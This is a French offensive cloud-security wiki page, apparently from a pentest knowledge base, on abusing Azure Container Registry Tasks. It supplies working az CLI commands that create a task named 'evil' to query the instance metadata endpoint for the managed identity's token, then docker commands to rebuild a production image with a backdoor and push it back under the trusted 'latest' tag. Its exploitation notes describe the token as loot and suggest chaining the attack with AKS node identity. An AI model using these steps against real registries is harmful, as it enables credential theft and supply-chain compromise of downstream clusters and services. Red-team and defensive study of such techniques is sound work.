---
title: "Tasks : ACR Tasks sous une identité managée et empoisonnement d'images"
description: "Exécuter une ACR Task qui tourne dans le registre sous une identité managée, et pousser des images empoisonnées vers un dépôt de confiance."
keywords:
  - ACR Tasks
  - identité managée
  - push d'image
  - dépôt de confiance
  - build
---

# Tasks

Les **ACR Tasks** exécutent des étapes de build et de commande de conteneurs sur des ressources de calcul gérées par Azure à l'intérieur du registre, et une tâche peut se voir assigner une **identité managée**. Créer ou exécuter une tâche devient une exécution de code sous cette identité, et le registre est une source de confiance d'où AKS et App Service en aval récupèrent leurs images, de sorte qu'une image empoisonnée se propage.

## Exécuter une tâche sous l'identité du registre

```bash
# a quick task runs an arbitrary build step; with an assigned identity it holds that identity's token
az acr task create -r <registry> -n evil --context /dev/null \
  --cmd 'curl -s -H Metadata:true http://169.254.169.254/metadata/identity/oauth2/token?...' --assign-identity [system]
az acr task run -r <registry> -n evil
```

## Empoisonner une image de confiance

```bash
docker pull <registry>.azurecr.io/app:latest
# rebuild with a backdoor, keep the tag
docker build -t <registry>.azurecr.io/app:latest .
docker push <registry>.azurecr.io/app:latest
```

## Notes d'exploitation

- L'identité managée de la tâche est le butin : elle s'exécute sur des ressources de calcul Azure que vous n'avez pas à posséder, et son jeton agit sur l'ensemble de la portée que l'identité détient.
- Repousser le tag `latest` par-dessus une image de production est une porte dérobée de chaîne d'approvisionnement durable et discrète, jusqu'à ce que le digest soit épinglé.
- À combiner avec l'[identité de nœud AKS](../aks/node-identity.md) : le droit `AcrPull` du kubelet signifie que le cluster récupérera votre image empoisonnée.

## Outils

- **Azure CLI** (`az acr task create/run`).
- **docker** / **crane** : reconstruire et pousser des images.

## Références

- [Microsoft : ACR Tasks](https://learn.microsoft.com/azure/container-registry/container-registry-tasks-overview)
- [HackTricks Cloud : ACR](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/index.html)
- [NetSPI : MicroBurst](https://github.com/NetSPI/MicroBurst)
